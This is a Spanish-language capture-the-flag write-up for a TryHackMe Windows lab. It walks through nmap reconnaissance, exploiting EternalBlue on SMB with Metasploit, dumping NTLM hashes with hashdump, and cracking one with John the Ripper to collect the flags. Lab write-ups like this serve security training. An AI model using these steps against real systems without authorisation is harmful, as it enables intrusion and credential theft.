Pentesting Windows - TryHackMe
Herramientas utilizadas
Nmap

Metasploit

JohnTheRipper

Reconocimiento
Comprobamos conectividad y sistema operativo
bash
Copiar
Editar
ping -c 1 10.10.203.246
Observamos que devuelve ttl=127, lo que nos indica que se trata de una máquina Windows.

Escaneo de puertos
bash
Copiar
Editar
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn -oN escaneo.txt 10.10.203.246
Detección de vulnerabilidades en el puerto 445
bash
Copiar
Editar
nmap --script "vuln" -p445 10.10.203.246
Gain Access
Tras identificar la vulnerabilidad, accedemos a Metasploit:

bash
Copiar
Editar
msfconsole
Cargamos el exploit de EternalBlue:

bash
Copiar
Editar
use 0
Ajustamos los parámetros necesarios:

RHOSTS: IP de la máquina víctima

LHOST: IP de nuestra máquina atacante

Ejecutamos el exploit:

bash
Copiar
Editar
run
Accedemos satisfactoriamente a la máquina.

Escalate
Listamos los procesos:

bash
Copiar
Editar
ps
TryHackMe nos pide el último proceso ejecutado como NT AUTHORITY\SYSTEM, por ejemplo con el ID 2968.

Cracking
Volcamos los hashes de los usuarios:

bash
Copiar
Editar
hashdump
Copiamos la contraseña hash de Jon y la guardamos en un archivo para crackearla con JohnTheRipper:

bash
Copiar
Editar
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash
✅ --format=NT indica explícitamente que el hash es NTLM, el formato que Windows utiliza para almacenar contraseñas.
Si no se indica, John podría confundirlo con LM, MD2, etc.

Flags
Una vez encontradas las tres flags, podemos leerlas con:

bash
Copiar
Editar
type flag1.txt